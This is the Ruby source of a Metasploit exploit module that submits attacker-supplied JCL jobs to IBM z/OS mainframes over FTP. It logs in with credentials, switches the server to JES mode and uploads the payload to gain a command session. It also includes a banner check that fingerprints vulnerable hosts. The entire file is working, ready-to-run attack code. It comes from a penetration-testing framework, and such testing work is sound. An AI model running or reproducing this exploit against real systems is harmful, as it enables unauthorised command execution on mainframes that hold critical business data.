##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FTP JCL Execution',
        'Description' => %q{
          Submit JCL to z/OS via FTP and SITE FILE=JES.
          This exploit requires valid credentials on the target system.
        },
        'Author' => [
          'Bigendian Smalls',
          'mainframed a.k.a. soldier of fortran',
          'S&Oxballs a.k.a. chiefascot'
        ],
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'Platform' => ['mainframe'],
        'Privileged' => false,
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => '2013-05-12',
        'DisableNops' => 'true',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(21),
        OptInt.new('SLEEP', [ false, 'Time to wait before checking if job has completed.', 5 ])
      ]
    )
  end

  def post_auth?
    true
  end

  def check
    ##
    # Connect to get the FTP banner and check target OS
    ##
    fail_with(Failure::Unknown, "#{rhost}:#{rport} - Failed to connect to FTP server") unless connect_login

    print_good('Successfully connected to FTP server.')
    test_jes = send_cmd(['site', 'file=jes'])

    # Disconnect and check cached self.banner
    disconnect

    ##
    # Check if the target system has an FTP server running on z/OS"
    ##
    unless banner =~ /IBM FTP CS V.R./
      return CheckCode::Safe("We could not recognize the server banner: #{banner.strip}")
    end

    if test_jes =~ /200 SITE/
      return CheckCode::Vulnerable('Found IBM z/OS Banner and JES commands accepted')
    end

    CheckCode::Detected('Found IBM z/OS Banner but SITE FILE=JES failed. Try anyway!')
  end

  ##
  # Exploit the target system by submitting a JCL job via FTP
  ##
  def exploit
    fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} - Failed to connect to FTP server") unless connect_login

    print_good('Successfully connected to FTP server.')

    send_cmd(['site', 'file=jes'])
    print_good('Successfully switched to JES mode')

    jcl_file_name = Rex::Text.rand_text_alpha_upper(8)
    print_status("Uploading JCL file: #{jcl_file_name}")

    res = send_cmd_data(['put', jcl_file_name], payload.encoded)
    if res.nil?
      fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} - Failed to upload JCL to FTP server")
    end

    job_num = res.lines.first.split.last
    print_good("Job Submitted. Job number is #{job_num}")

    handler
    disconnect
  end
end
